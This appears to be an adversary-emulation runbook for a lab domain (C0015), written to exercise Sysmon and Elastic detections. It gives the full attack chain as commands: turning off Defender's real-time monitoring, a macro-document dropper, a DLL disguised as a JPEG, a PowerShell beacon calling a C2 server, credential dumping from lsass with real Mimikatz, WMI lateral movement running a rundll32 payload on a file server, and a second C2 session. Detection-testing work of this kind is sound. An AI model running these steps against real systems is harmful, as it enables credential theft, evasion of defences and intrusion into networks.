# C0015 — Phase-2 run checklist (S1→S9, one ordered pass)

Executable order for the whole pass: **re-establish session 1 → discovery (beacon) → share artifact → decision →
auth → credential access (real Mimikatz) → WMI lateral → session 2 → verify/cleanup**. One `run_id` threads S1→S9.
Repo HEAD: `main` (≥ `681e442`). Every step lists the machine; swap `RUN-20260928-02` for your real run_id.

## 0. Build & preflight (C2 host / Kali + VMs)

```bash
# Kali: build the two DLLs/EXE (mingw) + grab real Mimikatz
./payloads/packaging/build_dll.sh                                   # -> build/out/c0015-comparefor.jpg
x86_64-w64-mingw32-gcc -shared -o c0015_143_surrogate.dll payloads/dll/c0015_143_surrogate.c -luser32 -lshlwapi
git clone https://github.com/ParrotSec/mimikatz                    # use x64/mimikatz.exe (verify hash); copy to staging
```
```powershell
# C2 host: stage the phase-2 payloads next to build/out
New-Item -Force -ItemType Directory stage/ws01
Copy-Item c0015_143_surrogate.dll stage\ws01\
Copy-Item mimikatz.exe stage\ws01\
```
Preflight gates (M-1): wmic on WS01; `it.admin` ∈ local Administrators on **FS01** and **WS01**
(`runas /user:C0015\it.admin "cmd /c whoami /groups"`); Sysmon BALANCED loaded; Defender off
(`Set-MpPreference -DisableRealtimeMonitoring $true`); audit (4624/4625/4648/4672/4688).

## 1. Start C2-SIM v3 + HTTP server (C2 host)

```powershell
pwsh -File payloads/packaging/launch_servers.ps1 -C2Ip 192.168.50.1 -PublishDir build/out
# verify: c2sim.log first line = "C2-SIM v3 listening ..." ; http://192.168.50.1:8000/c0015-comparefor.jpg -> 200
```

## 2. Generate configs (C2 host; fill real run_id)

```powershell
pwsh -File payloads/packaging/make_config.ps1 -RunId RUN-20260928-02 -C2Host 192.168.50.1 -OutPath stage/ws01/config.ini
Copy-Item payloads/hta/bootstrap.hta    stage\ws01\
Copy-Item payloads/beacon/c0015_beacon.ps1 stage\ws01\
# phase7 config (session 2) — copy the example, set the SAME run_id
Copy-Item payloads/config/c0015-phase7.example.ini stage\ws01\config-phase7.ini   # edit run_id inside
```

## 3. Re-establish session 1 (WS01, duc.user)

```powershell
powershell -ExecutionPolicy Bypass -File .\stage_ws01.ps1 -Source C:\stage        # config.ini + hta + beacon -> C:\Users\Public\C0015\
powershell -ExecutionPolicy Bypass -File .\install_macro_docm.ps1 -MacroSource .\macro_payload.vba
# open test.docm ONCE (Enable Content)
```
Verify: `c2sim.log` → `register stage=phase3 host=WS01 token=… ok=True (registered)` (ONE line, dedup otherwise);
markers `b64-marker.txt`, `js-marker.txt`, `c0015-comparefor.jpg`, `dll-executed.txt`.

## 4. Get the session token (operator console)

```powershell
$tok = (Invoke-RestMethod "http://192.168.50.1:8080/sessions" | Where-Object stage -eq "phase3").token
$tok   # S1-<16hex> — used for /cmd and /runbook below
```

## 5. Discovery — play the kill-chain runbook (C2 host; beacon runs on WS01)

```powershell
Invoke-RestMethod -Method Post -Uri "http://192.168.50.1:8080/runbook?session=$tok&name=c0015-phase2"
Get-Content c2sim.log -Tail 30      # watch 10x task=OP-CMD ... result ... ok=True (accepted)
```
Optional micro-manage: `Invoke-RestMethod -Method Post -Uri ".../cmd?session=$tok" -Body "net view /all"`.
Verify (Elastic): E1 children of the beacon powershell; each `process.command_line` matches the tasked command.
Collect evidence: `powershell -ExecutionPolicy Bypass -File .\collect_ws01_evidence.ps1 -SinceMinutes 30 -OutPath C:\Users\Public\c0015-evidence.json`

## 6. S5 — share artifact (WS01 + C2 host)

```powershell
net view \\FS01
Get-SmbShare | Out-File C:\ProgramData\found_shares.txt          # mirror path ([LAB ASSUMPTION])
# optional DIRECT link: task it via /cmd instead ("powershell -c Get-SmbShare ...")
```
```powershell
# C2 host
python scripts/lab_tools.py artifact-new ART-04-01 RUN-20260928-02 5 6 --payload stage/ws01/found_shares.json -o stage/ws01/art04_01.json
```

## 7. S6 — decision (C2 host)
```powershell
python scripts/lab_tools.py artifact-new ART-04-02 RUN-20260928-02 6 8 --payload stage/ws01/target-manifest.json -o stage/ws01/art04_02.json
# selection_reason must be derived from ART-04-01 content (target = FS01)
```

## 8. S7 — auth controls (WS01; password at prompt only)

**Why:** validate WHICH identity may reach FS01 before the WMI pivot, and (key) plant the
it.admin logon SESSION on WS01 so S7b's lsass dump can find it. A `net use IPC$` logon proves share/logon
rights but does NOT change the WS01 process token — the identity for S8 is re-supplied explicitly by runas.

```powershell
net use \\FS01\IPC$ /user:C0015\duc.user *      # A. denied  (S4625)
net use \\FS01\IPC$ /user:C0015\it.admin *      # B. allowed (S4624 T3 + S4672)  ← plants it.admin on WS01
net use /delete \\FS01\IPC$
net use \\FS01\IPC$ /user:C0015\<revoked> *     # C. denied
net use /delete \\FS01\IPC$
```
`python scripts/lab_tools.py artifact-new ART-05-01 RUN-20260928-02 5 6 --payload stage/ws01/auth-bundle.json -o stage/ws01/art05_01.json`

## 9. S7b — credential access (REAL Mimikatz; WS01; operator-driven)

```powershell
# stage the real tool first
Copy-Item stage\ws01\mimikatz.exe \\WS01\C$\Tools\mimikatz.exe
# harvest the it.admin session anchored in step 8; password at the runas prompt ONLY
runas /user:C0015\it.admin "C:\Tools\mimikatz.exe sekurlsa::logonpasswords"
# guardrail: output stays in the console; close the window; NEVER copy/pipe it to files/logs/repo
```
Verify (Elastic): WS01 **S4648** (runas it.admin) + **E1 mimikatz.exe** (parent cmd) + **E10 ProcessAccess
target lsass.exe** (real high GrantedAccess). Nothing in `c2sim.log` (this step is outside the beacon).

## 10. S8 — lateral (WS01 → FS01)

```powershell
# S8a handoff (T1570): 143.dll + beacon + phase7 config to FS01
copy stage\ws01\c0015_143_surrogate.dll \\FS01\C$\C0015\
copy payloads\beacon\c0015_beacon.ps1         \\FS01\C$\C0015\
copy stage\ws01\config-phase7.ini             \\FS01\C$\C0015\config-phase7.ini
# S8b WMI remote process (explicit it.admin; password at prompt)
runas /user:C0015\it.admin "cmd /c wmic /node:FS01 process call create \"rundll32.exe C:\\C0015\\c0015_143_surrogate.dll,LabEntry\""
```
Fallback if wmic absent: `Invoke-CimMethod … -Credential (Get-Credential C0015\it.admin)` (record `PARTIAL`).
`python scripts/lab_tools.py artifact-new ART-06-01 RUN-20260928-02 6 7 --payload stage/ws01/remote-process.json -o stage/ws01/art06_01.json`
Gate (4): FS01 rundll32 process / identity (S4648 + FS01 S4624/4672 same FS01 LogonId) / DLL hash / callback S9.

## 11. S9 — session 2 (automatic after S8b)

```powershell
Get-ChildItem evidence/run-ledger | Sort-Object LastWriteTime | Select-Object -Last 5   # ART-07-01-<token8>.json
Get-Content c2sim.log -Tail 10                                                          # register phase7-session2 ok=True + T-DISCOVER-CORPUS result
```
Verify (Elastic FS01): E1 rundll32 (same ProcessGuid as S8b), **E7** `C:\C0015\c0015_143_surrogate.dll`
(hash = ART-06-01), E11 `c0015_143-executed.txt`, E3 → `192.168.50.1:8080`.
Acceptance: **server-side ART-07-01 receipt + callback telemetry in the same run** — marker alone is NOT enough.

## 12. Verify & cleanup

- Run the per-stage skeletons from `docs/phase2-detection-prep-s4-s9.md`; reconcile joins per §8b map of the
  playbook (ProcessGuid same-host; FS01 4624↔4672 by FS01 LogonId; never 4648↔4624 by LogonId).
- Record ledger rows S1–S9 under the one run_id (statuses in allowed vocabulary).
```powershell
pwsh -File payloads/packaging/launch_servers.ps1 -Stop
Remove-Item -Recurse -Force C:\Users\Public\C0015, "$env:USERPROFILE\Desktop\test.docm"   # WS01
Remove-Item -Recurse -Force C:\C0015, C:\Tools\mimikatz.exe                                # FS01/WS01
# Re-enable Defender + restore routine Sysmon profile.
```